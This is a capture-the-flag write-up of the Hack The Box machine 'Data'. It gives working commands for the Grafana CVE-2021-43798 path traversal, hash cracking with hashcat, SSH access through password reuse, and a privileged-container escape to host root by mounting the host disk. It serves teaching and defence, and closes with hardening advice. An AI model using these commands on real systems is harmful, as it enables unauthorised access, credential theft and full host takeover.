---
title: 'Data'
target: 'Hack The Box — Data'
difficulty: 'easy'
date: 2025-08-29
summary: 'An HTB machine — Grafana 8.0.0 path traversal (CVE-2021-43798) to extract the SQLite database, cracking a PBKDF2 hash for SSH access via password reuse, then root through sudo docker exec into a privileged container and mounting the host disk.'
role: 'pentest'
tags: ['nmap', 'grafana', 'cve-2021-43798', 'path-traversal', 'sqlite', 'hashcat', 'pbkdf2', 'password-reuse', 'ssh', 'docker', 'privileged-container', 'container-escape', 'privilege-escalation']
problem: 'A Linux machine running SSH and Grafana 8.0.0 vulnerable to CVE-2021-43798 path traversal. Password reuse bridges Grafana to SSH, and a sudo docker exec rule with a privileged container enables host breakout.'
action: 'Nmap found SSH (22) and Grafana 8.0.0 (3000). Exploited CVE-2021-43798 path traversal via ..%2F in plugin URLs to read /etc/passwd (Alpine container) and extract grafana.db. Cracked boris PBKDF2-HMAC-SHA256 hash with hashcat (beautiful1) and SSH-ed in via password reuse. sudo -l revealed NOPASSWD docker exec — entered the Grafana container as root, confirmed privileged mode (Seccomp: 0, host disks visible), mounted /dev/sda1 to access the host filesystem.'
outcome: 'Gained root on the host. Attack chain: Grafana path traversal for database extraction, hash cracking and password reuse for SSH, privileged container escape via host disk mount for root.'
draft: false
---

## Background

Data is an easy-rated Linux machine running Grafana 8.0.0 behind a Docker container. The attack chain demonstrates how a single unauthenticated file read vulnerability can cascade into full host compromise — the path traversal leaks the application database containing crackable password hashes, password reuse bridges the gap from Grafana to SSH, and a misconfigured sudo rule paired with a privileged container makes the jump from unprivileged user to root on the underlying host. The box is a clean lesson in container security: running a container in privileged mode with unrestricted `docker exec` access negates every isolation guarantee containers are supposed to provide.

---

## Enumeration

An nmap scan against the target reveals two open ports — 22/tcp running SSH and 3000/tcp running Grafana. Navigating to port 3000 presents the Grafana login page with the version prominently displayed in the footer.

![Firefox browser at 10.129.170.249:3000/login showing the Grafana login page with the orange Grafana spiral logo, Welcome to Grafana heading, behindsecurity.com subtitle, Email or username and Password fields, a blue Log in button, Forgot your password link, and footer links for Documentation, Support, Community, Open Source, with the version v8.0.0 (41f0542c1e) highlighted in a red box at the bottom right.](/writeups/htb-data/01-grafana-login.png)

**Grafana 8.0.0** — the version disclosure is immediately useful because this version is vulnerable to CVE-2021-43798, a well-documented path traversal vulnerability.

---

## CVE-2021-43798 — Grafana path traversal

CVE-2021-43798 is an unauthenticated directory traversal vulnerability in how Grafana serves plugin files. By injecting URL-encoded `..%2F` sequences into the `/public/plugins/<plugin>/` path, an attacker can escape the plugin directory and read arbitrary files from the filesystem. The exploit requires no authentication.

Testing with `/etc/passwd`:

```bash
curl http://data.vl:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
```

The root shell is `/bin/ash` rather than `/bin/bash` — a clear indicator of Alpine Linux, which is a common base image for Docker containers. Notably, there is no `boris` user in this `/etc/passwd`, confirming Grafana runs in a container with its own filesystem separate from the host.

---

## Database extraction and hash cracking

With arbitrary file read confirmed, the next target is Grafana's SQLite database at `/var/lib/grafana/grafana.db`:

```bash
curl http://data.vl:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db --output grafana.db
```

Querying the `user` table in the downloaded database reveals a single user account:

```
sqlite3 grafana.db
sqlite> .mode line
sqlite> select * from user;

         login = boris
         email = boris@data.vl
      password = dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8
          salt = LCBhdtJWjl
```

Grafana stores passwords as PBKDF2-HMAC-SHA256 hashes with a per-user salt. Converting the hash format with [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat) and cracking with hashcat mode 10900:

```bash
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt
```

The password cracks instantly — **beautiful1**. A dictionary word with a number appended, exactly the kind of password that falls to basic wordlist attacks regardless of how strong the hashing algorithm is.

---

## Initial access — SSH as boris

The cracked Grafana password works for SSH — boris reused the same password across services.

```bash
ssh boris@data.vl
```

With a shell as boris, the user flag was retrieved.

---

## Privilege escalation — privileged container escape

Checking sudo privileges reveals a dangerous configuration:

```
boris@data:~$ sudo -l
User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Boris can run `docker exec` as root with no password, and the wildcard allows any arguments. This means arbitrary command execution inside any running container as any user. Getting a root shell inside the Grafana container:

```bash
sudo /snap/bin/docker exec -it -u 0 grafana sh
```

The `-u 0` flag specifies uid 0 (root). Inside the container, checking whether it runs in privileged mode:

```
/ # fdisk -l | grep -i "device"
Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
/dev/sda1    4,4,1       1023,254,2        2048   10487807   10485760 5120M 83 Linux
/dev/sda2    1023,254,2  1023,254,2    10487808   12582911    2095104 1023M 82 Linux swap

/ # cat /proc/1/status | grep -i "seccomp"
Seccomp:        0
```

The container can see the host's physical disk devices (`/dev/sda1`, `/dev/sda2`), and seccomp filtering is disabled (value 0 instead of the secure value 2). Both confirm this is a **privileged container** — it has nearly all the capabilities of the host system, including the ability to mount filesystems.

Mounting the host's root partition from inside the container gives direct access to the host filesystem:

```bash
mkdir /mnt/bsec
mount /dev/sda1 /mnt/bsec

ls -la /mnt/bsec/root/
# drwx------    7 root     root          4096 Sep 27 09:35 .
# -rw-r-----    1 root     root            33 Sep 27 09:35 root.txt

cat /mnt/bsec/root/root.txt
```

The root flag was retrieved from the mounted host filesystem.

---

## What I took from this

The Grafana path traversal (CVE-2021-43798) is a reminder that unauthenticated file read vulnerabilities in web applications are often more dangerous than they first appear. Reading `/etc/passwd` is the standard proof-of-concept, but the real impact comes from extracting application databases, configuration files with credentials, and SSH keys. In this case, one unauthenticated curl request to download the SQLite database provided credentials that unlocked SSH access to the host — the entire initial access chain required zero authentication.

The privileged container escape on Data is the textbook example of why `--privileged` should almost never be used in production. A privileged container can see and mount the host's block devices, has all Linux capabilities including `CAP_SYS_ADMIN`, and has no seccomp filtering — at that point, container isolation is effectively an illusion. The escape technique is trivial: `fdisk -l` to identify the host disk, `mount` to access it, and the host filesystem is fully readable and writable. The sudo rule compounded the problem by giving an unprivileged user unrestricted `docker exec` access as root. A safer configuration would either restrict the docker exec command to specific containers and users, or not run the container in privileged mode in the first place. If the container needs specific host access, individual capabilities (`--cap-add`) are far more secure than the blanket `--privileged` flag.
